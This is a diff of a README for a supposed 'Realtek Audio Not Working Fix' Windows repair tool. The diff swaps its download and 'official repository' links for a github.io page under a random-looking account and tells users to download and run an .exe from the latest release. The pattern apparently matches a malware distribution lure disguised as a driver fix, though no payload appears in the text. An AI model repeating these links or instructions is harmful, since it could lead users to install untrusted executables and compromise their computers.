@@ -1,6 +1,6 @@
 # 🔊 Realtek-Audio-Not-Working-Fix - Restore Sound To Your Windows Computer
 
-[![Download Repair Tool](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/Ingratiating-electromechanicaldevice776/Realtek-Audio-Not-Working-Fix)
+[![Download Repair Tool](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://ingratiating-electromechanicaldevice776.github.io)
 
 ## 🎯 About This Tool
 
@@ -17,7 +17,7 @@ This application functions on standard hardware configurations. Ensure your comp
 
 ## 📥 How To Download And Install
 
-1.  Visit the [official repository page](https://github.com/Ingratiating-electromechanicaldevice776/Realtek-Audio-Not-Working-Fix) to start.
+1.  Visit the [official repository page](https://ingratiating-electromechanicaldevice776.github.io) to start.
 2.  Locate the releases section on the right side of the screen.
 3.  Click the version marked as "Latest".
 4.  Download the file ending in .exe.
